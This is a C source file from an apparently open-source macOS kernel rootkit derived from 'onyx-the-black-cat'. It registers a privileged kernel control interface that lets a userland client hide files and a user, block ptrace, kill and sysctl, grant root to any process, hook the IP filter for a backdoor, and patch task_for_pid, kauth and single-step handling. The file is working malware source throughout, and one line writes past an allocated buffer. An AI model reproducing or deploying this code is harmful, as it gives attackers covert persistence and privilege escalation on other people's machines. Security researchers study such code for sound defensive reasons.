/*
 * Copyright (c) fG!, 2011, 2012, 2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * Original code from "onyx-the-black-cat". Modified by Enzo Matsumiya (@enzolovesbacon).
 *
 * Copyright (c) 2013, 2014 - Enzo Matsumiya (@enzolovesbacon)
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 *    derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include "kctl.h"
#include <sys/conf.h>
#include <sys/kernel.h>
#include <string.h>
#include <sys/systm.h>
#include <stdbool.h>
#include <sys/param.h>
#include <stdint.h>
#include <sys/kern_control.h>
#include <netinet/kpi_ipfilter.h> /* ipf ipv4 */
#include "shared_data.h"
#include "data_def.h"
#include "sysent.h"
#include "kpatch.h"
#include "anti.h"
#include "backdoor.h"

#define QUEUE_DATA_SIZE 32

extern int g_pid; /* 'anti.c' */
extern char *files_to_hide[MAX_FILES_TO_HIDE]; /* 'anti.c' */
extern int current_idx_file_hidden; /* 'anti.c' */
extern char *g_hidden_user; /* 'anti.c */
extern ipfilter_t g_ip_filter_ipv4_ref; /* 'backdoor.c' */

static int ctl_connect(kern_ctl_ref ctl_ref, struct sockaddr_ctl *sac, void **unitinfo);
static errno_t ctl_disconnect(kern_ctl_ref ctl_ref, u_int32_t unit, void *unitinfo);
static int ctl_get(kern_ctl_ref ctl_ref, u_int32_t unit, void *unitinfo, int opt, void *data, size_t *len);
static int ctl_set(kern_ctl_ref ctl_ref, u_int32_t unit, void *unitinfo, int opt, void *data, size_t len);

static int g_max_clients;
static kern_ctl_ref g_ctl_ref;
static u_int32_t g_client_unit = 0;
static kern_ctl_ref g_client_ctl_ref = NULL;
static boolean_t g_kern_ctl_registered = FALSE;

static struct kern_ctl_reg g_ctl_reg = {
	BUNDLE_ID,		/* Reverse DNS name which includes a unique (company) name */
	0,			/* 0 for dynamically assigned control ID - CTL_FLAG_REG_ID_UNIT not set */
	0,			/* ctl_unit - ignored when CTL_FLAG_REG_ID_UNIT not set */
	CTL_FLAG_PRIVILEGED,	/* Privileged access required to access this filter */
	0,			/* Use default send size buffer */
	0,			/* Override receive buffer size */
	ctl_connect,		/* Called when a connection request is accepted */
	ctl_disconnect,		/* Called when a connection becomes disconnected */
	NULL,			/* ctl_send_func - handles data sent from the client to kernel control - not implemented */
	ctl_set,		/* Called when the user process makes the setsockopt call */
	ctl_get			/* Called when the user process makes the getsockopt call */
};

kern_return_t install_kctl(void)
{
	errno_t error = 0;
	
	/* register the kernel control */
	error = ctl_register(&g_ctl_reg, &g_ctl_ref);
	
	if(error == 0) {
		g_kern_ctl_registered = TRUE;
		
		return KERN_SUCCESS;
	} else {
		return KERN_FAILURE;
	}
}

kern_return_t remove_kctl(void)
{
	errno_t error = 0;
	
	/* remove kernel control */
	error = ctl_deregister(g_ctl_ref);
	
	switch(error) {
		case 0:
			return KERN_SUCCESS;
			
		default:
			return KERN_FAILURE;
	}
}

/*
 *	XXX: not used
 */
kern_return_t queue_userland_data(void *data)
{
	kern_return_t ret = KERN_FAILURE;
	
	if(data == NULL)
		return ret;
	
	if(g_client_ctl_ref == NULL)
		return ret;
	
	ret = ctl_enqueuedata(g_client_ctl_ref, g_client_unit, data, QUEUE_DATA_SIZE, 0);
	
	return ret;
}

static int ctl_connect(kern_ctl_ref ctl_ref, struct sockaddr_ctl *sac, void **unitinfo)
{
	/* only accept a single client */
	if(g_max_clients > 0)
		return EBUSY;
	
	g_max_clients++;
	
	/*
	 * store the unit ID and ctl_ref of the client that connected
	 *
	 * we will need these to queue data to userland
	 */
	g_client_unit = sac->sc_unit;
	g_client_ctl_ref = ctl_ref;
	
	return 0;
}

static errno_t ctl_disconnect(kern_ctl_ref ctl_ref, u_int32_t unit, void *unitinfo)
{
	/* reset vars */
	g_max_clients = 0;
	g_client_unit = 0;
	g_client_ctl_ref = NULL;
	
	return 0;
}

/*
 *	XXX: not used
 */
static int ctl_get(kern_ctl_ref ctl_ref, u_int32_t unit, void *unitinfo, int opt, void *data, size_t *len)
{
	int retv = 0;
	
	char *test = _MALLOC(QUEUE_DATA_SIZE, M_TEMP, M_WAITOK);
	memset(test, 0, QUEUE_DATA_SIZE);

	strncpy(test, "testing kernel to userland", QUEUE_DATA_SIZE);
	
	retv = queue_userland_data(test);
	
	return retv;
}

static int ctl_set(kern_ctl_ref ctl_ref, u_int32_t unit, void *unitinfo, int opt, void *data, size_t len)
{
	if(len == 0 || data == NULL) {
		return EINVAL;
	}
	
	switch(opt) {
		case SET_PID:
		{
			g_pid = strtol(data, NULL, 10);
			
			break;
		}
			
		case ANTI_PTRACE_ON:
			anti_ptrace(ENABLE);
			
			break;
			
		case ANTI_PTRACE_OFF:
			anti_ptrace(DISABLE);
			
			break;
			
		case ANTI_KILL_ON:
			anti_kill(ENABLE);
			
			break;
			
		case ANTI_KILL_OFF:
			anti_kill(DISABLE);
			
			break;
			
		case ANTI_SYSCTL_ON:
			anti_sysctl(ENABLE);
			
			break;
			
		case ANTI_SYSCTL_OFF:
			anti_sysctl(DISABLE);
			
			break;
			
		case HIDE_FILE_ON:
		{
			if(data == NULL) {
				break;
			}
			
			int len = strlen(data) + 1;
			
			if(current_idx_file_hidden == MAX_FILES_TO_HIDE) {
				break;
			}
			
			files_to_hide[current_idx_file_hidden] = _MALLOC(len, M_TEMP, M_WAITOK);
			
			if(files_to_hide[current_idx_file_hidden] == NULL) {
				break;
			}
			
			strlcpy(files_to_hide[current_idx_file_hidden], data, len);
			
			current_idx_file_hidden++;
			
			hide_file(ENABLE);
			
			break;
		}
			
		case HIDE_FILE_OFF:
		{
			int i;
			for(i = 2; i < MAX_FILES_TO_HIDE; i++)
				files_to_hide[i] = NULL;
			
			hide_file(DISABLE);
			
			break;
		}

		case GIVE_ROOT:
		{
			char *end;
			int pid;
			
			pid = strtol(data, &end, 10);
			
			if(pid == 0) {
				break;
			}
			
			set_seteuid();
			
			giveroot(pid);
			
			break;
		}
			
		case HOOK_IPF_ON:
			hook_ipf();
			
			break;
			
		case HOOK_IPF_OFF:
			if(g_ip_filter_ipv4_ref != NULL) {
				ipf_remove(g_ip_filter_ipv4_ref);
			}
			
			break;
			
		case PATCH_TASK_FOR_PID:
			patch_task_for_pid(ENABLE);
			
			break;
			
		case UNPATCH_TASK_FOR_PID:
			patch_task_for_pid(DISABLE);
			
			break;
			
		case ANTI_KAUTH_ON:
			patch_kauth(ENABLE);
			
			break;
			
		case ANTI_KAUTH_OFF:
			patch_kauth(DISABLE);
			
			break;
			
		case PATCH_RESUME_FLAG:
			patch_resume_flag(ENABLE);
			
			break;
			
		case UNPATCH_RESUME_FLAG:
			patch_resume_flag(DISABLE);
			
			break;
			
		case PATCH_SINGLESTEP:
			patch_singlestep(ENABLE);
			
			break;
			
		case UNPATCH_SINGLESTEP:
			patch_singlestep(DISABLE);
			
			break;
			
		case HIDE_USER_ON:
		{
			if(data == NULL) {
				break;
			}
			
			if(g_hidden_user) {
				_FREE(g_hidden_user, M_TEMP);
			}
			
			int len = strlen(data) + 1;
			g_hidden_user = _MALLOC(len, M_TEMP, M_WAITOK);
			
			/* malloc failed */
			if(g_hidden_user == NULL) {
				break;
			}
			
			strlcpy(g_hidden_user, data, len);
			
			g_hidden_user[len] = '\0';
			
			hide_user(ENABLE);
			
			break;
		}
			
		case HIDE_USER_OFF:
			_FREE(g_hidden_user, M_TEMP);
			
			g_hidden_user = NULL;
			
			hide_user(DISABLE);
			
			break;
			
		default:
			return ENOTSUP;
	}
	
	return 0;
}